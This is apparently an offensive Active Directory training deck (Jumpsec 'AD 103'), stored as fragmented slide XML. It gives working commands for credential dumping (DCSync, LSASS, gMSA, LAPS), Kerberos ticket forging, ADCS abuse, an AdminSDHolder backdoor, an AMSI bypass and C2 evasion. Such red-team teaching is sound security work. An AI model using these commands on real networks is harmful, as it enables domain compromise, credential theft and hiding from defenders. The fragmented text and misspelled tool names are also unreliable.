            <a:ext cx="4023360" cy="2048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Find who can read LAPS passwords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LAPSToolkit.ps1 -Function Find-LAPSDelegatedGroups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LAPSToolkit.ps1 -Function Find-AdmPwdExtendedRights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Read the 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LAPSToolkit.ps1 -Function Get-LAPSComputers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Get-ADComputer WORKSTATION01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-Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd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Windows LAPS (new, Azure-backed)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Get-LapsADPassword WORKSTATION01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-AsPlainText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182880" y="4361688"/>
            <a:ext cx="877824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182880" y="4361688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65760" y="441655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Legacy LAPS:  ms-Mcs-AdmPwd (plaintext in AD)  |  Windows LAPS (2023+):  msLAPS-EncryptedPassword — requires decrypt rights or admin access on the DC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4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gMSA Abuse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Group Managed Service Accounts — machine-managed passwords readable by authorised principals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gMSAs have their passwords automatically managed by the DC and readable only by authorised computers/groups via msDS-GroupMSAMembership. If you compromise a principal in that group, you get the password.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182880" y="1627632"/>
            <a:ext cx="8778240" cy="5029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182880" y="1627632"/>
            <a:ext cx="8778240" cy="54864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365760" y="16916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Exploit Flow:  Enumerate gMSAs  →  Check msDS-GroupMSAMembership  →  Compromise an authorised principal  →  Extract password blob  →  Use as NTLM hash / request TGT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182880" y="2212848"/>
            <a:ext cx="4206240" cy="2697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>
            <a:off x="182880" y="2212848"/>
            <a:ext cx="4206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365760" y="23317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Enumerate &amp; Extract (Linux)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228600" y="2615184"/>
            <a:ext cx="4114800" cy="22219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320040" y="2688336"/>
            <a:ext cx="3931920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NetExec module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--gmsa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gMSADumper.py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gMSADumper.py -u user -p pass -d corp.local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Output: svc_account$:aad3b435...:NTHASH:::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Use NTLM hash directly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smb 10.10.10.5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 'svc_account$' -H NTHASH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4617720" y="2212848"/>
            <a:ext cx="4297680" cy="2697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4617720" y="2212848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4800600" y="23317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Enumerate &amp; Extract (Windows)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4663440" y="2615184"/>
            <a:ext cx="4206240" cy="22219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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2688336"/>
            <a:ext cx="4023360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Find gMSA accounts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Get-ADServiceAccount -Filter *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-Properties msDS-GroupMSAMembership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Who can read the password?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(Get-ADServiceAccount svc_account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-Properties msDS-GroupMSAMembership)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.msDS-GroupMSAMembership.Access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Extract password blob (if authorised)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$gmsa = Get-ADServiceAccount svc_account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-Properties msDS-ManagedPassword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$mp = New-Object Microsoft.ActiveDirectory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.Management.ADServiceAccountPasswordInfo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ConvertTo-NTHash $mp.CurrentPassword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000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5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DOMAIN DOMINANCE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DCSync, Golden Tickets, ADCS, AdminSDHolder, cross-trust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DCSync &amp; Credential Dumping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Replicate NTDS.DIT — dump all domain password hashes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6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Jumpsec | AD 103: You Have Credentials. Now What?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@Jumpsec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DCSync abuses the MS-DRSR replication protocol. Any account with DS-Replication-Get-Changes-All (GenericAll / WriteDACL on domain) can simulate a DC and pull hashes — no NTDS.DIT access needed.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182880" y="1627632"/>
            <a:ext cx="4206240" cy="24231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Impacket secretsdump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228600" y="2029968"/>
            <a:ext cx="4114800" cy="19659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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2103120"/>
            <a:ext cx="3931920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Remote DCSync (needs replication rights)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secretsdum.py corp.local/user:pass@dc01 -just-dc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Only NTLM hashes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secretsdum.py corp.local/user:pass@dc01 -just-dc-ntlm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AES keys too (for OPtH)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secretsdum.py corp.local/DA:pass@dc01 -just-dc -outputfile dump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Local NTDS.DIT offline dump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secretsdum.py -ntds ntds.dit -system SYSTEM LOCAL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4617720" y="1627632"/>
            <a:ext cx="4297680" cy="24231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Mimikatz (Windows)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4663440" y="2029968"/>
            <a:ext cx="4206240" cy="19659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4754880" y="2103120"/>
            <a:ext cx="4023360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privilege::debug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token::elevate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LSASS dump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sekurlsa::logonpasswords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sekurlsa::ekeys          # AES keys for OPtH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DCSync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lsadump::dcsync /domain:corp.local /all /csv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lsadump::dcsync /user:krbtgt  # just krbtgt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182880" y="4160520"/>
            <a:ext cx="2103120" cy="11704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182880" y="4160520"/>
            <a:ext cx="210312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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="4270248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nanodump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292608" y="4526280"/>
            <a:ext cx="1883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Indirect LSASS dump — evades handle-based AV hooks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2395728" y="4160520"/>
            <a:ext cx="2103120" cy="11704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2395728" y="4160520"/>
            <a:ext cx="210312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2505456" y="4270248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pypykatz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2505456" y="4526280"/>
            <a:ext cx="1883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Pure Python Mimikatz alternative — run from Linux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4608576" y="4160520"/>
            <a:ext cx="2103120" cy="11704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4608576" y="4160520"/>
            <a:ext cx="2103120" cy="54864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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4718304" y="4270248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procdump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4718304" y="4526280"/>
            <a:ext cx="1883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Microsoft-signed binary dump — AV-blind, parse offline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6821424" y="4160520"/>
            <a:ext cx="2103120" cy="11704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"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6821424" y="4160520"/>
            <a:ext cx="2103120" cy="54864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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6931152" y="4270248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lsass sniff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6931152" y="4526280"/>
            <a:ext cx="1883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ntlmrelayx / pcaptools — capture creds in transit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7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Golden &amp; Silver Tickets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Forge Kerberos tickets for persistent, offline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182880" y="1078992"/>
            <a:ext cx="4206240" cy="3749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182880" y="1078992"/>
            <a:ext cx="4206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365760" y="11978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Golden Ticket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365760" y="1490472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Forge a TGT using the krbtgt hash. Any user, any service, any time. Survives password resets (must rotate krbtgt twice to kill). Requires: krbtgt NTLM hash + Domain SID.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228600" y="2176272"/>
            <a:ext cx="4114800" cy="2606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320040" y="2249424"/>
            <a:ext cx="3931920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Impacket ticketer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ticketeer.py -nthash KRBTGT_HASH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-domain-sid S-1-5-21-XXXX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 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-user-id 500 administrator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export KRB5CCNAME=./administrator.ccache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impacket-psexec -k -no-pass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corp.local/administrator@dc01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Rubeus (Windows)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Rubeus.exe golden /rc4:KRBTGT_HASH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/domain:corp.local /sid:S-1-5-21-XXXX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/user:administrator /ptt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4617720" y="1078992"/>
            <a:ext cx="4297680" cy="3749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"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="1078992"/>
            <a:ext cx="4297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4800600" y="11978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Silver Ticket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4800600" y="1490472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Forge a TGS for a specific service using its account hash. Stealthier — never contacts the KDC. Target CIFS, HOST, HTTP, LDAP SPNs for persistent access to individual services.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4663440" y="2176272"/>
            <a:ext cx="4206240" cy="2606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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2249424"/>
            <a:ext cx="4023360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Impacket ticketer (silver)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ticketeer.py -nthash SVC_HASH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-domain-sid S-1-5-21-XXXX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 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-spn cifs/dc01.corp.local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administrator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Mimikatz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kerberos::golden /user:admin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/domain:corp.local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/sid:S-1-5-21-XXXX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/target:dc01.corp.local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/service:cifs /rc4:SVC_HASH /ptt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CIFS → file access, HOST → WMI exec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8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AD Certificate Services (ADCS)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ESC1–ESC8: certificate templates as a path to Domain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182880" y="107899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ADCS is frequently misconfigured. Certipy and Certify enumerate vulnerable templates allowing privilege escalation to DA without touching LSASS.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182880" y="1572768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182880" y="1572768"/>
            <a:ext cx="429768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292608" y="166420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ESC1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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="1664208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Enrollee supplies SAN — request cert as any user (DA)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4617720" y="1572768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>
            <a:off x="4617720" y="1572768"/>
            <a:ext cx="429768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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4727448" y="166420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ESC2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5577840" y="1664208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Any-purpose EKU or no EKU — abuse as DA auth cert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182880" y="2377440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>
            <a:off x="182880" y="2377440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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="246888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ESC3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1143000" y="2468880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Certificate Request Agent EKU — enroll on behalf of others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4617720" y="2377440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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="2377440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4727448" y="246888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ESC4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5577840" y="2468880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Writable template — modify ACL/settings to enable ESC1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182880" y="3182112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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3182112"/>
            <a:ext cx="4297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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="327355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ESC6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1143000" y="3273552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EDITF_ATTRIBUTESUBJECTALTNAME2 on CA — SAN on any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4617720" y="3182112"/>
            <a:ext cx="429768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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="3182112"/>
            <a:ext cx="4297680" cy="54864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4727448" y="327355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ESC8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5577840" y="3273552"/>
            <a:ext cx="3227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NTLM relay to AD CS HTTP enrollment endpoint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182880" y="4032504"/>
            <a:ext cx="8778240" cy="71323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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4032504"/>
            <a:ext cx="877824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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="41422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Certipy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2286000" y="4114800"/>
            <a:ext cx="6858000" cy="5943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2377440" y="4187952"/>
            <a:ext cx="66751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certipy find -u user@corp.local -p pass -dc-ip 10.10.10.1 -vulnerable -stdout   # enumerate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certipy req  -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local  # ESC1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certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1                                # auth → get hash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9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AdminSDHolder &amp; Cross-Domain Trust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9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Persistent backdoors and inter-forest escalation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9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9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182880" y="1078992"/>
            <a:ext cx="4206240" cy="35204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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="1078992"/>
            <a:ext cx="4206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365760" y="11978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AdminSDHolder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365760" y="149047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AdminSDHolder is a template container whose ACL is propagated to all protected groups (DA, EA, Schema Admins etc.) every 60 minutes by SDProp. Add a backdoor ACE here → persistent GenericAll on all admin groups — survives DA password resets.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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2304288"/>
            <a:ext cx="4114800" cy="2221992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320040" y="2377440"/>
            <a:ext cx="3931920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Add backdoor GenericAll ACE to AdminSDHolder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Add-DomainObjectAcl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-TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local'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-PrincipalIdentity backdoor_user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-Rights All -Verbose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Wait ~60 min or force SDProp manually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Invoke-ADSDPropagation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Verify propagation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Get-DomainObjectAcl -Identity 'Domain Admins'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-ResolveGUIDs | Where {$_.SecurityIdentifier -match 'backdoor'}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4617720" y="1078992"/>
            <a:ext cx="4297680" cy="35204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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="1078992"/>
            <a:ext cx="4297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4800600" y="11978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Cross-Domain Trust Abuse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4800600" y="149047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Bi-directional or one-way trusts allow escalation across domains. With DA in a child domain, forge inter-realm tickets with the Enterprise Admin SID to own the forest root.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4663440" y="2148840"/>
            <a:ext cx="4206240" cy="23774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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2221992"/>
            <a:ext cx="4023360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Enumerate trusts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Get-DomainTrust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nxc ldap dc01 -u user -p pass -M enum_trusts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Child → Parent: ExtraSid (SID History) attack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Need: child DA + inter-realm trust key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ticketeer.py -nthash TRUST_KEY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 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-domain-sid CHILD_SID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-extra-sid EA_SID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administrator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Mimikatz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lsadump::trust /patch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kerberos::golden /domain:child.corp.local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/sid:CHILD_SID /rc4:TRUST_KEY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/user:EA /sids:EA_SID /ptt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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3657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0"/>
              <a:buFont typeface="Consolas"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="13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C2, BOFs &amp; EVASION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Staying in — frameworks, in-memory ops, and defender bypass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Jumpsec | AD 103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1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C2 Frameworks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Command &amp; Control for persistent, structured engagements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Jumpsec | AD 103: You Have Credentials. Now What?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@Jumpsec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182880" y="1078992"/>
            <a:ext cx="877824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182880" y="1078992"/>
            <a:ext cx="8778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365760" y="1170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Sliver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2240280" y="1170432"/>
            <a:ext cx="1463040" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 13333" name="adj"/>
            </a:avLst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2240280" y="11704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OPEN SOURCE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365760" y="1536192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Go-based multi-operator C2 by BishopFox. mTLS/WireGuard/HTTP(S)/DNS. Built-in Kerberos, BOF support via Armory, SOCKS5 proxy, and port-forwarding. Strong OPSEC defaults.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5349240" y="119786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mTLS / DNS / HTTP implants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5349240" y="1444752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Built-in Kerberos + BOFs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5349240" y="1691640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SOCKS5 proxy, port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5349240" y="19385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Armory community extensions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182880" y="2377440"/>
            <a:ext cx="877824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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2377440"/>
            <a:ext cx="8778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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2468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Havoc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2240280" y="2468880"/>
            <a:ext cx="1463040" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 13333" name="adj"/>
            </a:avLst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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2240280" y="2468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OPEN SOURCE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365760" y="283464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Modern C2 focused on evasion. Demon implant bypasses ETW/AMSI via direct syscalls, process injection, and sleep masking. Active community. Excellent lab framework.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5349240" y="2496312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ETW / AMSI bypass built-in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5349240" y="2743200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Process injection (multiple)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5349240" y="299008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Sleep masking (Ekko/Zilean)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5349240" y="3236976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BOF + COFF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182880" y="3675888"/>
            <a:ext cx="877824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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3675888"/>
            <a:ext cx="87782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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="376732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Cobalt Strike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2240280" y="3767328"/>
            <a:ext cx="1463040" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 13333" name="adj"/>
            </a:avLst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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2240280" y="37673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COMMERCIAL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365760" y="4133088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Industry standard. Beacon implant, Malleable C2 profiles, teamserver, Aggressor Script automation, and the richest BOF ecosystem. Required knowledge for corporate red teams.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5349240" y="3794760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Malleable C2 profiles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5349240" y="404164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Aggressor Script (automation)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5349240" y="4288536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Beacon Object Files (BOFs)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5349240" y="453542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Jump / remote-exec lateral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2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BOFs &amp; In-Memory Execution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Run offensive tooling without touching disk — no new process, no disk write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BOFs are position-independent COFF objects executed inside a C2 agent's memory — no new process, no disk write. The primary modern alternative to reflective DLL injection and fork-and-run.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182880" y="1627632"/>
            <a:ext cx="4206240" cy="17830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Key BOF Collections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228600" y="2029968"/>
            <a:ext cx="4114800" cy="13258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320040" y="2103120"/>
            <a:ext cx="393192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TrustedSec BOF Collection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github.com/trustedsec/CS-Situational-Awareness-BOF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→ arp, netstat, whoami, sc, reg, wmi...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nanodump (LSASS BOF)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github.com/fortra/nanodump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→ Dump LSASS in-process, write to share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4617720" y="1627632"/>
            <a:ext cx="4297680" cy="17830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2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2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Inline Execute vs Fork-and-Run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4663440" y="2029968"/>
            <a:ext cx="4206240" cy="13258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4754880" y="2103120"/>
            <a:ext cx="402336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Fork-and-Run (old default — noisy)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Spawns sacrificial process → runs post-ex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Detectable by process creation events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Inline / BOF (modern — stealthy)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Runs inside beacon process memory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No child process, no disk write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Risk: crash kills your beacon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182880" y="3493008"/>
            <a:ext cx="4206240" cy="13716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182880" y="3493008"/>
            <a:ext cx="42062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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="36118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In-Memory .NET (execute-assembly)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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3895344"/>
            <a:ext cx="4114800" cy="9144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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3968496"/>
            <a:ext cx="39319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Cobalt Strike / Sliver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execute-assembly Rubeus.exe kerberoast /nowrap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execute-assembly SharpHound.exe -c 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execute-assembly Certify.exe find /vulnerable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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="3493008"/>
            <a:ext cx="4297680" cy="13716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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="3493008"/>
            <a:ext cx="4297680" cy="54864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4800600" y="361188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39D353"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>DLL Sideloading / Reflective Injection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4663440" y="3895344"/>
            <a:ext cx="4206240" cy="9144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4754880" y="3968496"/>
            <a:ext cx="4023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Sliver sideload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sideload /path/to/legit.exe /path/to/evil.dll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Donut — convert EXE/DLL to shellcode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donut -f 1 -i Rubeus.exe -o rubeus.bin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inject shellcode into any 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3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AMSI Bypass &amp; Defender Evasion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Getting tooling past Windows defences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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="4928616"/>
            <a:ext cx="658368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Jumpsec | AD 103: You Have Credentials. Now What?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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6949440" y="4928616"/>
            <a:ext cx="1920240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@Jumpsec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182880" y="1078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Modern Windows uses AMSI (Antimalware Scan Interface) to scan PowerShell, .NET, and JScript at runtime. Combine with ETW patching, sleep masking, and LOLBins for a layered evasion approach.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182880" y="1627632"/>
            <a:ext cx="4206240" cy="1920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182880" y="1627632"/>
            <a:ext cx="42062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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="36576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AMSI Bypass Techniques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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2029968"/>
            <a:ext cx="4114800" cy="1463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320040" y="2103120"/>
            <a:ext cx="393192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Memory patch — set amsiInitFailed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[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')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.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)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Identify detected strings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AMSITrigger.exe -i Invoke-Mimikatz.ps1 -f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4617720" y="1627632"/>
            <a:ext cx="4297680" cy="1920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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="1627632"/>
            <a:ext cx="42976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480060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Obfuscation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4663440" y="2029968"/>
            <a:ext cx="4206240" cy="1463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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2103120"/>
            <a:ext cx="402336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Invoke-Obfuscation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Invoke-Obfuscation&gt; SET SCRIPTPATH script.ps1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Invoke-Obfuscation&gt; TOKEN\ALL\1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Chameleon — CLI AMSI bypass generator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python3 chameleon.py -i script.ps1 -o out.ps1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Invoke-Stealth — randomise + encrypt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Invoke-Stealth -Script script.ps1 -Technique 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182880" y="365760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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3657600"/>
            <a:ext cx="28346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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="374904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ETW Patching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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="398678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Patch NtTraceEvent in ntdll — blind event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3172968" y="365760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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3172968" y="3657600"/>
            <a:ext cx="283464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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3282696" y="374904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LOLBins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3282696" y="398678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rundll32, mshta, regsvr32, certutil, bitsadmin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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="365760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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="3657600"/>
            <a:ext cx="283464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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6272784" y="374904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Direct Syscalls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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6272784" y="398678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Bypass AV/EDR hooks in ntdll with SysWhispers3/HellsGate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182880" y="461772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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4617720"/>
            <a:ext cx="2834640" cy="5486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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="470916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Sleep Masking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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608" y="494690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Ekko/Zilean — encrypt shellcode during sleep, evade scans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3172968" y="461772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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3172968" y="4617720"/>
            <a:ext cx="283464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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3282696" y="470916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Process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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3282696" y="494690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Classic, early-bird, module stomping, thread hijack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6163056" y="4617720"/>
            <a:ext cx="2834640" cy="8412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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="4617720"/>
            <a:ext cx="2834640" cy="54864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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6272784" y="4709160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9D353"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>Parent Spoof (PPID)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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6272784" y="494690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Spawn process under explorer.exe — bypass parent checks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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="164592" y="164592"/>
            <a:ext cx="8814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Tool Cheat Sheet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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="164592" y="731520"/>
            <a:ext cx="8814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Quick reference — what to use and when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164592" y="978408"/>
            <a:ext cx="8814816" cy="16459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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="1042416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Phase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2103120" y="1042416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Tool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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="1042416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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="1042416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Primary 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182880" y="1204265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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="1229868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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="1229868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BloodHound/SharpHound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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="1229868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Win/Linux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5522976" y="1229868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Attack path graph — start here every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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="1391717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182880" y="1399032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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="1417320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2103120" y="1417320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PowerView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4270248" y="1417320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5522976" y="1417320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LDAP enum, ACL querying, targeted queries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182880" y="1579169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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="1604772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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="1604772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ldapdomaindump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4270248" y="1604772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5522976" y="1604772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Full domain dump to HTML/JSON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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="1766621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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="1773936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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="1792224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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="1792224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Snaffler / Manspider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4270248" y="1792224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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="1792224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Share trawling for passwords and secrets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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="1954073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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="1979676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Kerberos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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="1979676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GetUserSPNs.py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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="1979676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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="1979676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Kerberoasting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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2141525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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2148840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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="2167128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Kerberos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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="2167128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GetNPUsers.py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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="2167128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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="2167128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AS-REP Roasting (no creds)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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
